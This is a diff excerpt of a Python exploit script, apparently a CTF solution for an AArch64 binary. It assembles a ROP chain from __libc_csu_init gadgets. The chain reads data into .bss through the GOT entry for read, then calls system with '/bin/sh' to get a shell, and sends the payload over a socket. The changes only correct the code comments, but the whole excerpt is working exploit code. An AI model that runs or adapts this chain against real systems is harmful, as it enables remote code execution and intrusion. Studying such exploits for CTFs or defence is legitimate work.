@@ -89,16 +89,16 @@ buf += p64(0)               # X19 = 0
 buf += p64(1)               # X20 = 1
 buf += p64(pie_base + elf.got.read)    # X21 -> X3 gets GOT
 buf += p64(0)               # X22 -> W0 1st arg
-buf += p64(bss_addr)        # X23 -> X1 2nd arg
-buf += p64(16)              # X24 -> X2 3rd arg bss aria
+buf += p64(bss_addr)        # X23 -> X1 2nd arg bss area
+buf += p64(16)              # X24 -> X2 3rd arg
 buf += p64(0)               # X29
 buf += p64(libc_csu_init2)  # X30 __libc_csu_init2
 buf += p64(0)               # X19 = 0
 buf += p64(1)               # X20 = 1
 buf += p64(bss_addr)        # X21 -> X3 system
-buf += p64(bss_addr+8)      # X22 -> W0 1st arg
+buf += p64(bss_addr+8)      # X22 -> W0 1st arg /bin/sh
 buf += p64(0)               # X23 -> X1 2nd arg
-buf += p64(0)               # X24 -> X2 3rd arg /bin/sh
+buf += p64(0)               # X24 -> X2 3rd arg
 s.sendline(buf)
 
 sleep(1)
